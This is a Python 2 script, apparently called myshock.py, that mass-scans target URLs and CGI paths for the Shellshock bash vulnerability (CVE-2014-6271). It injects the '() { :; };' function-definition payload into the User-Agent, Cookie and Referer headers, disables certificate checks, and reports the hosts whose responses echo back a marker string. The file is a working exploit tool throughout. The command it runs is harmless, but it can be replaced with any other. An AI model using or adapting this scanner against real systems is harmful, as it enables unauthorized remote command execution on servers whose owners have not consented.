#!/usr/bin/python

def banner():
    print "-" * 70
    print """
                                        _/                            _/
   _/_/_/  _/_/    _/    _/    _/_/_/  _/_/_/      _/_/      _/_/_/  _/  _/
  _/    _/    _/  _/    _/  _/_/      _/    _/  _/    _/  _/        _/_/
 _/    _/    _/  _/    _/      _/_/  _/    _/  _/    _/  _/        _/  _/
_/    _/    _/    _/_/_/  _/_/_/    _/    _/    _/_/      _/_/_/  _/    _/
                     _/
                _/_/
"""
    print "-" * 70
    print "Usage | python myshock.py <targets_file> <cgilist_file>"
    print "E.X   | python myshock.py target_list.txt cgi_list.txt"
    print "-" * 70

#Import our modules
import httplib, sys

from urlparse import urlparse
from threading import Thread
from Queue import Queue

try:
    # get arguments
    target_file = sys.argv[1]
    cgi_file = sys.argv[2]

    concurrent = 1
    targets = open(target_file, "r")

except IndexError:
    banner()
    print "IndexError"
    sys.exit(1)

def doWork():
    while True:
        url = q.get()
        status, url, body = getStatus(url)
        doSomethingWithResult(status, url, body)
        q.task_done()

def getStatus(ourl):
    global CEHCK_SUM
    # set payload command
    CEHCK_SUM = "You are SHOCK!!"
    Command = "/bin/echo " + CEHCK_SUM
    # set HTTP header
    USER_AGENT = "() { :; }; echo Content-type:text/plain; echo; " + Command
    Cookie = "() { :; }; echo Content-type:text/plain; echo; " + Command
    Host = "() { :; }; echo Content-type:text/plain; echo; " + Command
    Referer = "() { :; }; echo Content-type:text/plain; echo; " + Command

    try:
        url = urlparse(ourl)
        if url.scheme == "https":
            # HTTPS Connection
            import ssl
            ssl._create_default_https_context = ssl._create_unverified_context
            conn = httplib.HTTPSConnection(url.netloc)
        else:
            # HTTP Connection
            conn = httplib.HTTPConnection(url.netloc)

        conn.putrequest("POST", url.path)
        conn.putheader("User-Agent", USER_AGENT)
        conn.putheader("Cookie", Cookie)
        conn.putheader("Referer", Referer)
        conn.endheaders()
        res = conn.getresponse()
        return res.status, ourl, res.read().strip()

    except:
        #Throw an error if something goes wrong.
        return "EXCEPTION: {0}".format(ourl)

def doSomethingWithResult(status, url, body):
    #Only print a URL to STDOUT when an HTTP 200 response is received.
    #msg = "Vulnerable to the 'shellshock' (http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271)."
    if body == CEHCK_SUM:
        print "\033[1;32m[+]\033[1;mHTTP CODE 200 > {0} > \033[1;33m{1}\033[1;m".format(url, body)
        #print " +--" + msg
        print ""
    else:
        pass

q = Queue(concurrent * 2)
for i in range(concurrent):
    t = Thread(target=doWork) #Set the doWork() function as a target for the threading daemon
    t.daemon = True
    t.start() #Start our threading daemon.

try:
    #Print our banner, show values set, and wait for user input
    banner()
    print "\033[1;34m[*]\033[1;mThread Count: {0}".format(concurrent)
    print ""
    print "-" * 40
    print "\033[1;34m[*]\033[1;mTarget Addresses"
    print "-" * 40
    for line in targets:
        print "\033[1;32m>>\033[1;m {0}".format(line.strip())
    targets.close()
    print "-" * 40
    print ""
    raw_input("\033[1;34m[*]\033[1;mPress [ENTER] to start scan-")

    #Append http:// to our URL read from our url list if it isn't defined
    #Then, append a cgi file path to the end of our URL and add it to the queue
    for url in open(target_file):
        if "http" not in url:
            url = "http://" + url.strip()
    	else:
            url = url.strip()
        for file in open(cgi_file): #Uncomment this line if you are using your own cgi path file as the 3rd system argument (sys.argv[3]).
            q.put(url.strip() + file.strip())
    q.join()

except:
    #Throw an error if something goes wrong.
    print "\033[1;33mSomething goes wrong!\033[1;m"
    import traceback
    traceback.print_exc()
    sys.exit(1)
